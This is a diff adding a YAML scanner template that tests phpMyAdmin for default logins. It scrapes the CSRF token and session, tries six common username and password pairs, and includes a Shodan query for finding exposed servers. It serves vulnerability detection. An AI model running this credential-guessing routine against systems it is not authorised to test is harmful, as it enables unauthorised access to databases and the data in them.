@@ -1,0 +1,113 @@
+id: phpmyadmin-default-login
+
+info:
+  name: phpMyAdmin - Default Login
+  author: Natto97
+  severity: high
+  verified: false
+  description: |
+    phpMyAdmin contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+    SHODAN: http.title:phpMyAdmin
+  reference:
+    - https://www.phpmyadmin.net
+  tags: default-login,phpmyadmin
+  created: 2023/06/24
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /index.php
+      headers:
+        Cookie: pma_lang=zh_CN; phpMyAdmin=m15m21feai3qnavvaj3jqjalcs; ajs_anonymous_id=e0c233ed-e359-4010-9935-2a35c82e91ec; ajs_user_id=78ba1121cd8779edc4c58d7369d81a2cc137e6ce
+    expression: response.body.bcontains(b'name="token"') && response.body.bcontains(b'name="set_session"')
+    output:
+      search: |
+        "name=\"token\" value=\"(?P<token>.*?)\"".bsubmatch(response.body)
+      token: search["token"]
+      search1: |
+        "name=\"set_session\" value=\"(?P<token2>.*?)\"".bsubmatch(response.body)
+      token2: search1["token2"]
+      search2: |
+        "phpMyAdmin=(?P<session>[0-9a-z]+)".bsubmatch(response.raw_header)
+      session: search2["session"]
+  r1:
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username=root&pma_password=root&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=') 
+    stop_if_match: true
+  r2:
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username=root&pma_password=123456&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=') 
+    stop_if_match: true
+  r3:
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username=mysql&pma_password=mysql&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=') 
+    stop_if_match: true
+  r4:
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username=root&pma_password=toor&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=')
+    stop_if_match: true 
+  r5:
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username=test&pma_password=test&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=')
+    stop_if_match: true
+  r6:
+    request:
+      method: POST
+      path: /index.php
+      headers:
+        Cookie: phpMyAdmin={{token2}}; pma_lang=en
+      body: |
+        set_session={{session}}&pma_username=test&pma_password=123456&server=1&route=%2F&token={{token}}
+    expression: |
+      response.status == 302 &&
+      response.raw_header.ibcontains(b'phpMyAdmin=') && 
+      response.raw_header.ibcontains(b'pmaUser-1=') &&
+      response.raw_header.bcontains(b'index.php?')
+    stop_if_match: true
+expression: (r0() && r1()) || (r0() && r2()) || (r0() && r3()) || (r0() && r4()) || (r0() && r5()) || (r0() && r6())
